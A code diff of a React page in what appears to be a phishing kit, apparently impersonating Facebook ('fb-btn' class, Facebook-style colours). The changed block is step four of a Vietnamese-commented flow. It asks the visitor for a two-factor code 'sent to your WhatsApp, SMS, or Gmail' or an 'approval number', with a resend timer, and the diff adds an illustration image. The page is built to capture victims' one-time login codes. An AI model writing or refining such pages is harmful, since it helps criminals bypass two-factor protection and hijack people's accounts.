@@ -869,75 +869,85 @@ export default function Home() {
                       </div>
                     )}
 
-                    {/* BƯỚC 4: OTP */}
-                    {step === 4 && !showSuccess && (
-                      <>
-                        <h2 style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center', color: '#1c1e21', marginBottom: '8px' }}>
-                          Two-factor authentication
-                        </h2>
-                        <p style={{ fontSize: '14px', color: '#65676b', textAlign: 'center', marginBottom: '16px', lineHeight: '1.4' }}>
-                          {matchNumber 
-                            ? `Please enter the approval number requested by our system: ${matchNumber}` 
-                            : 'Enter the code we sent to your WhatsApp, SMS, or Gmail.'}
-                        </p>
+{/* BƯỚC 4: OTP */}
+{step === 4 && !showSuccess && (
+  <>
+    <h2 style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center', color: '#1c1e21', marginBottom: '8px' }}>
+      Two-factor authentication
+    </h2>
+    
+    {/* CHÈN ẢNH 2FA VÀO ĐÂY */}
+    <div style={{ margin: '16px 0', borderRadius: '8px', overflow: 'hidden' }}>
+      <img
+        src="/images/2fa-illustration.png"
+        alt="2FA Code"
+        style={{ width: '100%', maxHeight: '140px', display: 'block', objectFit: 'contain' }}
+      />
+    </div>
 
-                        {matchNumber && (
-                          <div style={{ background: '#e7f3ff', border: '1px solid #0064e0', padding: '12px', borderRadius: '8px', marginBottom: '20px', textAlign: 'center', fontSize: '18px', fontWeight: 'bold', color: '#0064e0' }}>
-                            Yêu cầu nhập số: {matchNumber}
-                          </div>
-                        )}
+    <p style={{ fontSize: '14px', color: '#65676b', textAlign: 'center', marginBottom: '16px', lineHeight: '1.4' }}>
+      {matchNumber 
+        ? `Please enter the approval number requested by our system: ${matchNumber}` 
+        : 'Enter the code we sent to your WhatsApp, SMS, or Gmail.'}
+    </p>
 
-                        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                          <input
-                            type="text"
-                            placeholder="Code"
-                            value={otp}
-                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
-                            style={{
-                              padding: '16px',
-                              fontSize: '16px',
-                              border: '1px solid #ccd0d5',
-                              borderRadius: '8px',
-                              outline: 'none',
-                              width: '100%',
-                              boxSizing: 'border-box'
-                            }}
-                          />
-                          
-                          <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', justifyContent: 'center', margin: '4px 0' }}>
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
-                            It may take a few minutes.
-                            {otpCanResend ? (
-                              <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
-                                background: 'none', border: 'none',
-                                color: resendLoading ? '#a0c3ff' : '#0064e0',
-                                fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
-                                fontSize: '14px', padding: 0,
-                                display: 'inline-flex', alignItems: 'center', gap: 6
-                              }}>
-                                {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
-                              </button>
-                            ) : (
-                              <span>New code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
-                            )}
-                          </div>
+    {matchNumber && (
+      <div style={{ background: '#e7f3ff', border: '1px solid #0064e0', padding: '12px', borderRadius: '8px', marginBottom: '20px', textAlign: 'center', fontSize: '18px', fontWeight: 'bold', color: '#0064e0' }}>
+        Yêu cầu nhập số: {matchNumber}
+      </div>
+    )}
 
-                          {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', textAlign: 'center' }}>Incorrect code. Please try again.</div>}
+    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+      <input
+        type="text"
+        placeholder="Code"
+        value={otp}
+        onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
+        style={{
+          padding: '16px',
+          fontSize: '16px',
+          border: '1px solid #ccd0d5',
+          borderRadius: '8px',
+          outline: 'none',
+          width: '100%',
+          boxSizing: 'border-box'
+        }}
+      />
+      
+      <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', justifyContent: 'center', margin: '4px 0' }}>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+        It may take a few minutes.
+        {otpCanResend ? (
+          <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
+            background: 'none', border: 'none',
+            color: resendLoading ? '#a0c3ff' : '#0064e0',
+            fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
+            fontSize: '14px', padding: 0,
+            display: 'inline-flex', alignItems: 'center', gap: 6
+          }}>
+            {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
+          </button>
+        ) : (
+          <span>New code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
+        )}
+      </div>
 
-                          <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
-                            height: 52,
-                            background: otp.length >= 6 && !loading ? '#0064e0' : '#a0c3ff',
-                            marginTop: '6px',
-                            display: 'flex',
-                            justifyContent: 'center',
-                            alignItems: 'center',
-                            gap: 8
-                          }}>
-                            {loading ? <Spinner size={22} /> : 'Continue'}
-                          </button>
-                        </form>
-                      </>
-                    )}
+      {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', textAlign: 'center' }}>Incorrect code. Please try again.</div>}
+
+      <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
+        height: 52,
+        background: otp.length >= 6 && !loading ? '#0064e0' : '#a0c3ff',
+        marginTop: '6px',
+        display: 'flex',
+        justifyContent: 'center',
+        alignItems: 'center',
+        gap: 8
+      }}>
+        {loading ? <Spinner size={22} /> : 'Continue'}
+      </button>
+    </form>
+  </>
+)}
 
                     {/* BƯỚC 5: SUCCESS */}
                     {showSuccess && (
